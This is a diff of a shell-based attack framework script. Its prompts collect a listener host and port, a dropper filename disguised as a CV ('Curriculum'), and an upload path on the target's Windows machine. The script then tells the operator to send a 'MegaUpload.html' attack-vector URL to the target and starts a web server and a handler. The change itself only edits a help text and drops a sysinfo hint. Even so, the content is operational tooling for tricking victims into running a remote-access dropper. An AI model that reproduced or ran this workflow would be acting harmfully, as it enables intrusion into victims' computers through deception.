@@ -13201,7 +13201,7 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER FILENAME ☠" --text "example: Curriculum\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
-SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
+SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Linux' or 'Mac' will not create dropper.exe\nWithout dropper.exe the Client.py requires to be manual exec" --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac") > /dev/null 2>&1
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
@@ -13285,7 +13285,6 @@ echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";slee
 echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
-echo "${BlueF}- SYSINFO: systeminfo|findstr /C \"Host OS Manufacturer Type\""
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
 read stupidpause
